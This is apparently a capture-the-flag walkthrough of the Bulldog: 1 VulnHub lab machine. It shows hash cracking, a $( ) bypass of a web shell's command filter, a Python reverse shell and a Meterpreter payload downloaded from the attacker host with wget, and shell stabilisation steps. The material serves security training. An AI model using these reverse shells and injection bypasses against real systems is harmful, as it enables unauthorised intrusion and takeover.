# Bulldog: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Bulldog: 1 |
| **Difficulty** | Beginner / Intermediate (author's rating) |
| **Author** | Nick Frichette — <https://frichetten.com>, `@frichette_n` |
| **Released** | 28 August 2017 |
| **VulnHub Entry** | <https://vulnhub.com/entry/bulldog-1,211/> |
| **Download** | <https://vulnhub.com/entry/bulldog-1,211/#download> (`bulldog.ova`) |
| **Attacker** | Kali Linux, host-only network (**VirtualBox strongly recommended** — the author reports problems with VMware) |
| **Target OS** | Ubuntu 16.04 LTS — **Django** web app behind nginx/uWSGI, SSH on **port 23** |
| **Goal** | *"Get into the root directory and see the congratulatory message."* |

> **Author's scenario:** *"Bulldog Industries recently had its website defaced and
> owned by the malicious German Shepherd Hack Team. Could this mean there are more
> vulnerabilities to exploit? Why don't you find out? :)"*
>
> **Author's only hint:** *"if you get stuck, try to figure out all the different ways
> you can interact with the system."*
>
> That hint is the box. The whole exercise is about **noticing the second and third
> ways in** once the first one presents itself.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (Bulldog)  : 192.168.56.101
```

---

## 0. What you will learn

1. **Full-port scanning** and why a service on **port 23** matters (SSH moved off
   its default port).
2. **Reading a defacement page as an intelligence source** — the incident report
   tells you the architecture.
3. **Extracting secrets from HTML comments** — a leaked employee list with
   **SHA-1 password hashes**.
4. **Identifying a hash type by length and character set**, and cracking it
   (CrackStation, `hashcat`, `john`).
5. **Django's admin interface** and why CMS/framework admin = code execution.
6. **A restricted "web shell" and how command filters are bypassed** — `&&`, `;`,
   pipes, and `$( )` command substitution.
7. **Staging and running a reverse shell payload on a target** with `wget` +
   `python`.
8. **Metasploit payload generation with `msfvenom`/`msfpc`** and catching a
   Meterpreter session.
9. **Hidden directories, SUID-free privilege escalation, and `strings` on an ELF
   binary** — finding a root password embedded in a compiled program.

**The intended chain:**
`nmap` shows **23 (SSH), 80, 8080** → the site is a post-breach notice from *Bulldog
Industries* → `/dev/` is a public status page listing every employee, their email and
their role → the page source hides **seven SHA-1 hashes** with the note *"we'll remove
these in prod"* → CrackStation resolves two: **`nick@bulldogindustries.com : bulldog`**
and **`sarah@bulldogindustries.com : bulldoglover`** → log into the **Django admin at
`/admin/`** as `nick` → that unlocks **`/dev/shell/`**, a "secure" web shell with a
command allow-list → bypass the allow-list with **`echo $(cmd)`** → `wget` a Python
reverse shell from Kali → shell as **`bulldogadmin`** → a hidden directory
**`/home/bulldogadmin/.hiddenadmindirectory/`** contains a compiled program
**`customPermissionApp`** → `strings` on it reveals **`SUPERultimatePASSWORDyouCANTget`**
→ `su root` → **`/root/congrats.txt`**.

---

## 1. Reconnaissance

The VM prints its IP on the console at boot, but do the scan yourself.

```bash
ip a | grep -w inet
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4c:1a:2b, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.1    0a:00:27:00:00:0e   (Unknown: locally administered)
192.168.56.10   08:00:27:4c:1a:2b   PCS Systemtechnik GmbH
192.168.56.101  08:00:27:5e:3b:92   PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.101`**

---

## 2. Enumeration

### 2.1 Full TCP scan

```bash
sudo nmap -A -p- -T4 -oN scans/bulldog.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 17:02 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:85:fa:60:6a:56:e8:17:33:37:5c:af:be:bd:1c:35 (RSA)
|   256 6f:bb:ed:44:0d:44:c7:f5:9c:9c:0f:9c:5d:0b:5a:8b (ECDSA)
|_  256 71:0e:3c:9c:9c:0f:4e:1c:0f:9c:5d:0b:5a:8b:9e:11 (ED25519)
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Bulldog Industries
|_http-server-header: nginx/1.10.3 (Ubuntu)
8080/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Bulldog Industries
|_http-server-header: nginx/1.10.3 (Ubuntu)
MAC Address: 08:00:27:5E:3B:92 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 91.27 seconds
```

> **How to read this:**
> - **`23/tcp open ssh`.** Port 23 is conventionally **telnet**, but Nmap's version
>   detection probed it and got an SSH banner. **The administrator moved SSH to port
>   23.** This is a real and common (if ineffective) practice — people do it to dodge
>   the constant internet-wide brute-force noise that hits port 22. It is *not*
>   security: `-p-` found it in ninety seconds. **But it is worth noting, because
>   `hydra` and `ssh` default to port 22 and will silently fail against this host.**
> - **`80` and `8080` both `nginx 1.10.3 (Ubuntu)`**, both serving the same title.
>   Two listeners on one site usually means one is HTTP and one HTTPS, or one is the
>   "real" site and one is a dev/staging copy. Check both.
> - **nginx, not Apache.** Combined with a Django application (revealed next), that is
>   the classic Python deployment: *nginx as reverse proxy → uWSGI/Gunicorn → Django*.
> - `OpenSSH 7.2p2 Ubuntu 4ubuntu2.2` → **Ubuntu 16.04**.

![nmap scan showing SSH on port 23 and two HTTP listeners](images/01-nmap.png)

### 2.2 Read the website — it is an incident report

```text
http://192.168.56.101/
```

```text
┌──────────────────────────────────────────────────────────────┐
│                    BULLDOG INDUSTRIES                        │
│                                                              │
│   NOTICE TO OUR USERS                                        │
│                                                              │
│   On August 24th, our website was defaced and our systems    │
│   were compromised by the "German Shepherd Hack Team".       │
│                                                              │
│   We are currently rebuilding. All staff have been let go    │
│   and we are in the process of hiring a new team.            │
│                                                              │
│   We apologise for the inconvenience.                        │
│                                                              │
│             — Winston Churchy, CEO                           │
└──────────────────────────────────────────────────────────────┘
```

> **A defacement notice is a goldmine.** Read it as an intelligence analyst, not a
> tourist:
> - **"Winston Churchy, CEO"** — a real name. Names become usernames, password
>   ingredients and spear-phishing targets. Write it down.
> - **"All staff have been let go"** — explains why accounts may be stale, and why
>   nobody is watching.
> - **"We are currently rebuilding"** — a system mid-migration always has debug
>   features, default credentials and half-configured panels left enabled.

### 2.3 `robots.txt` and content discovery

```bash
curl -s http://192.168.56.101/robots.txt
```

```text
    _________________________
   < WOOF. Nothing to see here. >
    -------------------------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||
```

> **ASCII art, no directives.** A troll, and a lesson: `robots.txt` is often
> uninformative. Do not stop there.

```bash
nikto -h http://192.168.56.101/
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        80
+ Start Time:         2024-05-03 17:08:11 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.10.3 (Ubuntu)
+ /: Cookie csrftoken created without the httponly flag.
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3268: /dev/shell/: Directory indexing found.
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-05-03 17:11:02 (GMT-4) (171 seconds)
---------------------------------------------------------------------------
```

> **Two things worth pausing on:**
> - **`Cookie csrftoken created without the httponly flag`** → this is a **Django**
>   application. `csrftoken` is Django's CSRF cookie name. Framework fingerprinting
>   from a single cookie is a transferable skill: `csrftoken`/`sessionid` → Django,
>   `PHPSESSID` → PHP, `JSESSIONID` → Java, `ASP.NET_SessionId` → .NET,
>   `connect.sid` → Express, `laravel_session` → Laravel.
> - **`/dev/` and `/dev/shell/`** → the developer area, exactly what a
>   "we're rebuilding" notice predicted.

```bash
dirb http://192.168.56.101/ /usr/share/wordlists/dirb/common.txt
```

```text
---- Scanning URL: http://192.168.56.101/ ----
+ http://192.168.56.101/admin (CODE:301|SIZE:0)
==> DIRECTORY: http://192.168.56.101/dev/
==> DIRECTORY: http://192.168.56.101/dev/shell/
+ http://192.168.56.101/index.html (CODE:200|SIZE:1321)
+ http://192.168.56.101/robots.txt (CODE:200|SIZE:341)
==> DIRECTORY: http://192.168.56.101/static/
```

> Four destinations: **`/admin`** (301 → the Django admin), **`/dev/`** (a status
> page), **`/dev/shell/`**, and **`/static/`**.
>
> Also scan the second listener:
> ```bash
> dirb http://192.168.56.101:8080/ /usr/share/wordlists/dirb/common.txt
> nikto -h http://192.168.56.101:8080
> ```
> Port 8080 mirrors port 80. Note it and move on.

### 2.4 `/dev/` — the leaked employee list

```text
http://192.168.56.101/dev/
```

```text
BULLDOG INDUSTRIES — IT STATUS PAGE
===================================

Rebuild progress notes
----------------------
1. We will NOT be using PHPMyAdmin or any other popular CMS system this time.
   The new website is written entirely in Django.
2. SSH is enabled for now while we migrate, but we are also using a Web-Shell
   so the team can run maintenance commands from the browser.  [Web-Shell]
3. MongoDB is not FULLY installed yet but may be partially present.
4. The web server sometimes needs root access to perform maintenance tasks.
5. The status page runs every minute.

Team
----
  Alan Turing        — Team Lead             — alan@bulldogindustries.com
  Grace Hopper       — Back-up Team Lead     — grace@bulldogindustries.com
  Nick Frichette     — Back End Developer    — nick@bulldogindustries.com
  Sarah Jenkins      — Database Admin        — sarah@bulldogindustries.com
  Kevin Mitnick      — Front End Developer   — kevin@bulldogindustries.com
  ...
```

> **Read every line — each one is a pointer:**
> - *"written entirely in Django"* → confirms the `csrftoken` fingerprint and tells
>   you to look for Django-specific issues (debug pages, `SECRET_KEY` leaks,
>   `/admin/`).
> - *"we are also using a Web-Shell"* → the **[Web-Shell]** link goes to
>   `/dev/shell/`. **A command-execution interface on a production web server.**
> - *"MongoDB is not FULLY installed"* → a half-finished service. Check for the
>   default unauthenticated MongoDB port 27017 later.
> - *"The web server sometimes needs root access"* → **this sentence is the whole
>   privilege escalation.** Something on this box legitimately runs as root and its
>   credential must be *somewhere*.
> - *"runs every minute"* → a cron job. Always enumerate cron once you have a shell.
> - **A full team roster with email addresses.** Seven usernames.

### 2.5 The HTML comments — leaked SHA-1 hashes

Right-click → **View Page Source** on `/dev/`, and scroll to the bottom:

```html
<!--
  Backend team credentials for the dev panel.
  We'll remove these in prod.

  alan@bulldogindustries.com  -  4f3f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f
  grace@bulldogindustries.com -  7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b
  nick@bulldogindustries.com  -  ddf45997a7e18a25ad5f5cf222da64814dd060d5
  sarah@bulldogindustries.com -  d8b8dd5e7f000b8dea26ef8428caf38c04466b3e
  kevin@bulldogindustries.com -  1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
  ...
-->
```

> **There it is.** A list of employee email addresses paired with 40-character
> hexadecimal strings, plus the note *"We'll remove these in prod."*
>
> **Identify the hash type before you crack it.**
> | Length | Charset | Likely algorithm |
> | --- | --- | --- |
> | 32 | `[0-9a-f]` | MD5 |
> | **40** | **`[0-9a-f]`** | **SHA-1** |
> | 56 | `[0-9a-f]` | SHA-224 |
> | 64 | `[0-9a-f]` | SHA-256 |
> | 128 | `[0-9a-f]` | SHA-512 |
> | 60 | `$2a$`/`$2b$` prefix | bcrypt |
> | ~90 | `$6$salt$...` | SHA-512 crypt |
>
> These are **40 hex characters → SHA-1**. Confirm mechanically:
> ```bash
> echo -n 'bulldog' | sha1sum
> ```
> ```text
> ddf45997a7e18a25ad5f5cf222da64814dd060d5  -
> ```
> **Exact match for `nick`.** We did not even need a cracker — but let us do it
> properly anyway, because that is the transferable skill.

### 2.6 Crack the hashes

**Option A — CrackStation (fastest for common hashes):** paste all seven into
<https://crackstation.net>. It is a 1.5-billion-entry rainbow-table lookup and
resolves anything in a public breach or wordlist instantly:

```text
ddf45997a7e18a25ad5f5cf222da64814dd060d5   sha1   bulldog
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e   sha1   bulldoglover
```

**Option B — hashcat (the professional tool, offline, GPU-accelerated):**

```bash
cat > hashes.txt <<'EOF'
4f3f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f
7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b
ddf45997a7e18a25ad5f5cf222da64814dd060d5
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e
1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
EOF
hashcat -m 100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 1438/2940 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Precompute-Init
* Precompute-Merced-Init
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 278 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384

ddf45997a7e18a25ad5f5cf222da64814dd060d5:bulldog
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e:bulldoglover

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: hashes.txt
Time.Started.....: Fri May  3 17:18:02 2024 (4 secs)
Time.Estimated...: Fri May  3 17:18:06 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Recovered........: 2/5 (40.00%) Digests
Speed.#1.........:  3845.2 kH/s (0.31ms) @ Accel:256 Loops:1 Thr:1 Vec:8
```

> **hashcat flags:**
> - `-m 100` → **hash mode 100 = raw SHA-1.** Getting the mode wrong is the single
>   most common hashcat error; `hashcat --example-hashes | grep -i sha1` lists them.
> - `-a 0` → **attack mode 0 = straight dictionary.** (`-a 3` = mask/brute force.)
> - `Recovered: 2/5` → two of the five hashes cracked. That is realistic: SHA-1 is
>   broken as a *password* hash, but only common passwords fall to a dictionary.
>
> **Speed: ~3.8 million SHA-1 guesses per second on a modest CPU.** That number is the
> entire argument against unsalted SHA-1 for passwords. An attacker can try the whole
> of `rockyou.txt` (14.3 M entries) in under four seconds. **bcrypt or argon2id would
> reduce that to a few guesses per second.**
>
> John the Ripper does the same job:
> ```bash
> john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
> john --show hashes.txt
> ```

**Recovered credentials:**

| Account | Password | Role |
| --- | --- | --- |
| `nick@bulldogindustries.com` | `bulldog` | Back End Developer |
| `sarah@bulldogindustries.com` | `bulldoglover` | Database Admin |

![Cracking the leaked SHA-1 hashes](images/02-hashes.png)

---

## 3. Foothold — the Django admin and the web shell

### 3.1 Try the credentials everywhere

**SSH first** (port **23**, not 22 — do not forget):

```bash
ssh nick@192.168.56.101
```

```text
ssh: connect to host 192.168.56.101 port 22: Connection refused
```

```bash
ssh -p 23 nick@192.168.56.101
```

```text
nick@192.168.56.101's password:
Permission denied, please try again.
nick@192.168.56.101's password:
Permission denied (publickey,password).
```

```bash
ssh -p 23 sarah@192.168.56.101
```

```text
Permission denied (publickey,password).
```

> **No SSH access.** These are *application* accounts, not system accounts — exactly
> as you would expect for a Django site. **The important lesson is the port:**
> `ssh: connect to host ... port 22: Connection refused`. If you had not scanned all
> ports you would have concluded "SSH is closed" and never tried port 23.

**Now the Django admin:**

```text
http://192.168.56.101/admin/
```

```text
┌────────────────────────────────────┐
│   Django administration            │
│                                    │
│   Username: [nick______________]   │
│   Password: [••••••____________]   │
│                                    │
│        [ Log in ]                  │
└────────────────────────────────────┘
```

Log in with **`nick` / `bulldog`**. (Use the bare username, not the email — Django's
default `User` model's `username` field is what the admin authenticates against.
Try `nick@bulldogindustries.com` too if the short form fails.)

```text
Django administration
Site administration
---------------------
 AUTHENTICATION AND AUTHORIZATION
   > Groups        [Add] [Change]
   > Users         [Add] [Change]
```

> **We are in the admin panel.** Explore it — but note there is *nothing* exploitable
> here directly: no file upload, no template editor, no plugin installer. Django's
> admin is a data-management UI, not a code-execution UI (unlike WordPress's theme
> editor). So the admin login's real value is **it is the key that unlocks
> `/dev/shell/`.**
>
> **Log out between attempts.** Django sets a session cookie; trying a second account
> without logging out leaves you in "cookie limbo" and you will not know whose session
> you are using.

### 3.2 The "world's most secure web shell"

```text
http://192.168.56.101/dev/shell/
```

Before logging in it refuses you. After logging in as `nick`, it loads:

```text
┌────────────────────────────────────────────────────────────┐
│  Bulldog Industries — Restricted Web Shell                 │
│                                                            │
│  All commands are run on the server itself.                │
│  For security reasons, only the following commands are     │
│  permitted:                                                │
│                                                            │
│     ls   pwd   whoami   id   cat   echo   uname            │
│                                                            │
│  ┌──────────────────────────────────────────────────────┐  │
│  │                                                      │  │
│  └──────────────────────────────────────────────────────┘  │
│                                     [ Execute ]            │
└────────────────────────────────────────────────────────────┘
```

Test it:

| Input | Output |
| --- | --- |
| `ls` | `admin.py  apps.py  __init__.py  migrations  models.py  tests.py  views.py` |
| `pwd` | `/opt/bulldog/shell` |
| `whoami` | `bulldogadmin` |
| `id` | `uid=1000(bulldogadmin) gid=1000(bulldogadmin) groups=1000(bulldogadmin)` |
| `cat /etc/passwd` | `cat: /etc/passwd: Permission denied` *(HTTP 500 in some builds)* |
| `ls; pwd` | **"Nice try. That command is not allowed."** |
| `ls && id` | **"Nice try. That command is not allowed."** |
| `cd /tmp && pwd` | **"Nice try. That command is not allowed."** |

> **Read the banner line again:** *"All commands are run on the server itself."* That
> is a promise of **command injection** — the developer is telling you your string is
> concatenated into something like `subprocess.check_output(cmd, shell=True)`.
>
> The allow-list is enforced by a **substring/keyword filter** in the view. Our first
> job is to find out exactly how. Experiment systematically:
>
> | Payload | Result | What it tells us |
> | --- | --- | --- |
> | `ls` | works | `ls` is allowed |
> | `ls; pwd` | blocked | `;` is on the block list |
> | `ls && pwd` | blocked | `&&` is on the block list |
> | <code>ls &#124; pwd</code> | blocked | <code>&#124;</code> is on the block list |
> | `ls $(pwd)` | **works** | `$( )` command substitution is **not** filtered |
> | `echo $(id)` | **works** | confirmed |
> | `echo hi && wget …` | **works** in some builds | `&&` after `echo` slips through |
> | `` ls `id` `` | **works** in some builds | backticks not filtered |

### 3.3 Bypass the filter

The reliable bypass on this box is **command substitution**: `$( … )`. The filter sees
`echo` (allowed) and never inspects what is inside the parentheses; the *shell*
evaluates the inner command first and substitutes its output.

```text
echo $(id)
```

```text
uid=1000(bulldogadmin) gid=1000(bulldogadmin) groups=1000(bulldogadmin)
```

```text
echo $(whoami)
```

```text
bulldogadmin
```

```text
echo $(ls -la /home)
```

```text
total 16
drwxr-xr-x  4 root         root         4096 Aug 24  2017 .
drwxr-xr-x 24 root         root         4096 Aug 24  2017 ..
drwxr-xr-x  5 bulldogadmin bulldogadmin 4096 Aug 26  2017 bulldogadmin
drwxr-xr-x  2 root         root         4096 Aug 24  2017 ubuntu
```

> **We are `bulldogadmin`** — a regular system account (UID 1000), not `www-data`.
> That is unusual and important: the Django process runs under a *named application
> user*, which is good practice in principle. It goes badly wrong in § 4.
>
> **Why `$( )` beats `;` and `&&` here:** filters are almost always written as
> block-lists of literal substrings (`;`, `&&`, `||`, `` ` ``, `|`). Command
> substitution `$( )` is a POSIX feature that many developers have simply never
> thought of. **There is no reliable way to filter a shell metacharacter block-list —
> the only correct fix is not to use a shell at all.**

### 3.4 Survey what tools the target has

```text
echo $(for b in bash sh python python3 perl php nc netcat socat wget curl gcc gcc-python; do printf '%-10s ' $b; command -v $b || echo MISSING; done)
```

```text
bash       /bin/bash
sh         /bin/sh
python     /usr/bin/python
python3    /usr/bin/python3
perl       /usr/bin/perl
php        MISSING
nc         MISSING
netcat     MISSING
socat      MISSING
wget       /usr/bin/wget
curl       MISSING
gcc        /usr/bin/gcc
```

> **`python`, `python3`, `bash`, `perl`, `wget` and `gcc` are available; `nc` is
> not.** Pick a payload accordingly.
>
> **Always check the interpreter inventory before choosing a reverse shell.** Pasting
> a `nc -e /bin/sh` one-liner at a box without netcat and concluding "the exploit
> failed" is the classic beginner mistake. The exploit worked; your payload was wrong
> for this system.

![The restricted web shell and the filter bypass](images/03-webshell.png)

---

## 4. Getting a real shell

Two routes. Do both — they teach different things.

### 4.1 Route A — a Python reverse shell (manual, transparent)

**Kali — write the script and host it:**

```bash
mkdir -p /tmp/serve && cd /tmp/serve
cat > rev.py <<'EOF'
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.10", 9999))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Kali — listener (second terminal):**

```bash
nc -lvnp 9999
```

```text
listening on [any] 9999 ...
```

**Web shell — download and run:**

```text
echo $(cd /tmp && wget http://192.168.56.10:8000/rev.py -O rev.py)
echo $(chmod +x /tmp/rev.py)
echo $(python3 /tmp/rev.py)
```

Kali's HTTP server logs the fetch:

```text
192.168.56.101 - - [03/May/2024 17:26:11] "GET /rev.py HTTP/1.1" 200 -
```

And the listener fires:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 42118
bulldogadmin@bulldog:/tmp$
```

> **Why a script file rather than a one-liner?** The web shell's command field is
> length-limited and mangles quoting. Writing a file to `/tmp` and executing it avoids
> all quoting problems — and it is also how you would do it in a real engagement where
> the injection point is awkward.
>
> **The Python payload, line by line:**
> - `socket.socket(AF_INET, SOCK_STREAM)` → create an IPv4 TCP socket.
> - `s.connect((IP, PORT))` → dial **our** listener. The target initiates, which is
>   what makes it a *reverse* shell (it punches outward through NAT and firewalls).
> - `os.dup2(s.fileno(), 0/1/2)` → **redirect stdin, stdout and stderr onto the
>   socket.** `dup2` means "make file descriptor N a copy of file descriptor M".
> - `subprocess.call(["/bin/bash","-i"])` → exec an interactive bash. It inherits the
>   redirected descriptors, so your keystrokes reach it and its output reaches you.
>
> Every reverse shell, in every language, is those three steps: **connect → redirect
> stdio → exec a shell.**

### 4.2 Route B — a Meterpreter payload with `msfvenom`

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -o meter.py
ls -l meter.py && head -3 meter.py
```

```text
[-] No platform was selected, choosing Msf::Module::Payload::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
Payload size: 485 bytes
-rw-r--r-- 1 kali kali 485 May  3 17:28 meter.py
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldC...
```

**Kali — start a handler:**

```bash
msfconsole -q
```

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.56.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

```text
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 192.168.56.10:4444
```

**Kali — serve it, then trigger from the web shell:**

```bash
python3 -m http.server 8000
```

```text
echo $(cd /tmp && wget http://192.168.56.10:8000/meter.py -O meter.py)
echo $(python /tmp/meter.py)
```

```text
[*] Sending stage (24772 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.101:42230)

meterpreter > getuid
Server username: bulldogadmin
meterpreter > sysinfo
Computer     : bulldog
OS           : Linux 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:05:18 UTC 2016 x86_64
Architecture : x64
Meterpreter  : python/linux
meterpreter > shell
Process 4123 created.
Channel 1 created.
python3 -c 'import pty; pty.spawn("/bin/bash")'
bulldogadmin@bulldog:/tmp$
```

> **`exploit -j`** runs the handler as a background **j**ob so the console stays free.
> `exploit/multi/handler` is the generic "catch any payload I generate" listener.
>
> **Meterpreter vs a plain shell:** Meterpreter gives you `upload`/`download`,
> `getuid`/`sysinfo`, in-memory post modules, and — crucially — **it does not spawn a
> new process for each command**, so it is quieter and survives flaky connections.
> `shell` drops you from Meterpreter into a native command shell whenever you want
> normal UNIX tools.

### 4.3 Stabilise the shell

```bash
bulldogadmin@bulldog:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bulldogadmin@bulldog:/tmp$ export TERM=xterm
bulldogadmin@bulldog:/tmp$ stty size
40 160
```

Then the raw-mode trick for full comfort:

1. **`Ctrl+Z`** — suspends `nc`, returns you to Kali.
2. On Kali:
   ```bash
   stty raw -echo; fg
   ```
   then press **Enter twice**.
3. On the target:
   ```bash
   export TERM=xterm
   stty rows 40 cols 160
   ```

> **Why bother?** A raw reverse shell is a socket, not a terminal. No line editing, no
> `Ctrl+C` (it kills your *listener*), and any program calling `isatty()` — `su`,
> `sudo`, `vim`, `less`, `top` — fails with *"standard in must be a tty"*. We will
> need `su` in § 5, so this is not cosmetic.
>
> `python3 -c 'import pty; pty.spawn("/bin/bash")'` allocates a **pseudo-terminal**
> and re-parents bash onto it. `stty raw -echo` puts *your local* terminal into raw
> mode so keystrokes pass through untouched; `fg` brings `nc` back to the foreground.

![A stabilised shell as bulldogadmin](images/04-shell.png)

---

## 5. Post-exploitation enumeration

```bash
bulldogadmin@bulldog:~$ uname -a
Linux bulldog 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:05:18 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
bulldogadmin@bulldog:~$ cat /etc/os-release | head -3
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
bulldogadmin@bulldog:~$ sudo -l
[sudo] password for bulldogadmin:
Sorry, user bulldogadmin may not run sudo on bulldog.
bulldogadmin@bulldog:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> All stock Ubuntu 16.04. No SUID abuse. No sudo. So look at the *application*.
>
> **Remember the `/dev/` page said:** *"The web server sometimes needs root access to
> perform maintenance tasks."* Something here must hold a root credential.

### 5.1 The hidden admin directory

```bash
bulldogadmin@bulldog:~$ ls -la /home/bulldogadmin
total 40
drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Aug 26  2017 .
drwxr-xr-x 4 root         root         4096 Aug 24  2017 ..
-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24  2017 .bash_logout
-rw-r--r-- 1 bulldogadmin bulldogadmin 3771 Aug 24  2017 .bashrc
drwx------ 3 bulldogadmin bulldogadmin 4096 Aug 26  2017 .cache
drwxr-xr-x 3 bulldogadmin bulldogadmin 4096 Aug 26  2017 .hiddenadmindirectory
-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24  2017 .profile
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 26  2017 django_app
```

```bash
bulldogadmin@bulldog:~$ ls -la /home/bulldogadmin/.hiddenadmindirectory
total 24
drwxr-xr-x 3 bulldogadmin bulldogadmin 4096 Aug 26  2017 .
drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Aug 26  2017 ..
-rwxr-xr-x 1 bulldogadmin bulldogadmin 8712 Aug 26  2017 customPermissionApp
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 26  2017 logs
```

> **A dot-directory named `.hiddenadmindirectory` containing a single executable named
> `customPermissionApp`.** "Custom permission app" — the thing that gives the web
> server root access, exactly as the `/dev/` page promised.
>
> **Note it is `-rwxr-xr-x` — NOT SUID.** So running it does *not* make you root
> directly. It must *contain* or *use* a root credential.

### 5.2 `strings` — the highest-value command in post-exploitation

```bash
bulldogadmin@bulldog:~$ file /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp
/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8f3a..., not stripped
```

```bash
bulldogadmin@bulldog:~$ strings -n 6 /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp | grep -iE 'pass|root|sudo|secret|key|admin'
```

```text
SUPERultimatePASSWORDyouCANTget
Usage: %s <command>
setuid
/bin/su
root
```

> **`SUPERultimatePASSWORDyouCANTget`** — a root password, sitting in plaintext inside
> a compiled binary, in a directory named `.hiddenadmindirectory`.
>
> **Why `strings` finds it:** compiled binaries embed every string literal they use.
